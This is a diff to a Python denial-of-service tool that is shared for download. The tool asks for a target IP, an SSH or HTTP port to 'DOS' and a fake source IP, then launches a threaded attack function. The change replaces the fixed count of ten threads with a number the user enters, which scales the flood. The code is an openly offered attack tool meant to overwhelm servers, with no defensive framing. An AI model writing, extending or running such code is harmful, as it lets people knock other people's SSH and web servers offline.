@@ -6,6 +6,7 @@ print("Thanks for downloading! Make sure to check out my Github. https://github.
 target = input("Enter the target ip: ")
 port = int(input("Insert the port (Port 22: DOS the SSH servers, Port 80: DOS the HTTP servers): "))
 fake_ip = input("Enter a fake ip: ")
+numThreads = int(input("How many threads would you like to use? "))
 isCount = input("Do you want to see how many times the code runs? (Enter 'YES' or 'NO'): ")
 if (isCount == "YES"):
     count = True
@@ -25,6 +26,6 @@ def attack():
             connectedCount += 1
             print(connectedCount)
 
-for i in range(10):
+for i in range(numThreads):
     thread = threading.Thread(target=attack)
     thread.start()
